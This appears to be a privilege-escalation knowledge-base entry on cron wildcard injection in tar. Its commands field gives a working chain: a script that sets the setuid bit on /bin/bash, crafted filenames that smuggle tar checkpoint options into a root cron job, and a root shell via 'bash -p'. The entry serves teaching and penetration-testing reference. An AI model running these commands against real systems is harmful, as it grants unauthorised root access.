---
id: priv-004
title: "Cron Job Wildcard Injection"
category: privilege_escalation
tags: [cron, wildcard-injection, tar, linux-privesc, scheduled-tasks]
platform: [linux]
commands:
  - "cat /etc/crontab && ls -la /etc/cron*"
  - "echo 'chmod +s /bin/bash' > /tmp/privesc.sh && chmod +x /tmp/privesc.sh"
  - "touch '/tmp/--checkpoint=1' && touch '/tmp/--checkpoint-action=exec=sh privesc.sh'"
  - "/bin/bash -p"
references:
  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#wildcards-trick"
  - "https://www.exploit-db.com/papers/33930"
---

When a root-owned cron job executes a command with a wildcard (e.g., `tar czf backup.tgz *`) in a directory writable by a low-privileged user, an attacker can inject arbitrary tar command-line options by creating files whose names match valid flags. The wildcard expands to include all filenames in the directory, so crafted filenames like `--checkpoint=1` and `--checkpoint-action=exec=sh script.sh` are interpreted as tar options rather than file arguments, causing the cron job to execute arbitrary commands as root. This technique also applies to other binaries such as `rsync`, `zip`, and `chown` when they process wildcards in attacker-controlled directories.
